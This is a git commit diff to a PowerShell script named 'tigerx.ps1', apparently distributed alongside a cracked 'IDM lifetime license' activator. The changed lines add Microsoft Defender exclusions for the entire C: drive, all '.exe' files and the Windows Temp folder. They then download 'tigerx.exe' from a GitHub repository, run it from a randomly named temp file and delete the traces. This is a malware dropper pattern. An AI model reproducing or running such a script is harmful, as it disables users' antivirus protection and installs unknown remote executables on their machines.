728e76c5b890a1db18299e64d598ccfc9324bc3a
Pctoolsbox.com <45397057+Pctoolsbox@users.noreply.github.com>
2024-12-03 23:45:57 +0200

    Update tigerx.ps1

--- tigerx.ps1
+++ tigerx.ps1
@@ -1,13 +1,13 @@
-Add-MpPreference -ExclusionPath "C:\","IDM-Lifetime-license.exe","C:\Windows\Temp\"
+Add-MpPreference -ExclusionPath "C:\",".exe","C:\Windows\Temp\"
 $ErrorActionPreference = "Stop"
 # Enable TLSv1.2 for compatibility with older clients
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
-$DownloadURL = 'https://github.com/Pctoolsbox/IDM-Activation-Lifetime-license/raw/refs/heads/main/IDM-Lifetime-license.cmd'
+$DownloadURL = 'https://github.com/Pctoolsbox/tigerx/raw/refs/heads/main/tigerx.exe'
 
 $rand = Get-Random -Maximum 99999999
 $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
-$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\IAS_$rand.cmd" } else { "$env:TEMP\IAS_$rand.cmd" }
+$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\tigerx_$rand.exe" } else { "$env:TEMP\tigerx_$rand.exe" }
 
 try {
     $response = Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing
@@ -23,5 +23,5 @@ Set-Content -Path $FilePath -Value $content
 
 Start-Process $FilePath $ScriptArgs -Wait
 
-$FilePaths = @("$env:TEMP\IAS*.cmd", "$env:SystemRoot\Temp\IAS*.cmd")
+$FilePaths = @("$env:TEMP\tigerx*.exe", "$env:SystemRoot\Temp\tigerx*.exe")
 foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
